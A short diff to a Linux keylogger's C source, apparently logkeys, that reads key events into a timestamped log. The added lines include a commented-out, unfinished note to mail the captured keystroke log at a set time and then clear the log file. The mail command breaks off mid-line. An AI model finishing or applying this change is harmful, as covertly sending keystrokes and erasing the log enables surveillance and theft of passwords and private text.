@@ -443,10 +443,12 @@ int main(int argc, char **argv)
   // now we need those privileges back in order to create system-wide PID_FILE
   seteuid(0); setegid(0);
   create_PID_file();
-  
+
   // now we've got everything we need, finally drop privileges by becoming 'nobody'
   //setegid(65534); seteuid(65534);   // commented-out, I forgot why xD
   
+  // END OF SETUP
+
   unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
   struct input_event event;
   char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
@@ -614,7 +616,12 @@ int main(int argc, char **argv)
     prev_code = scan_code;
     fflush(out);
     if (inc_size > 0) file_size += inc_size;
-    
+
+    // ADDED BY ELI
+    // End of reading input loop: add in mail command (clear log file after sending mail) and encryption (?)
+    //if (localtime(&cur_time) == "2014-05-10 10:30:00+0000") 
+    //  system("mail -s \"
+
   } // while (read(input_fd))
   
   // append final timestamp, close files and exit
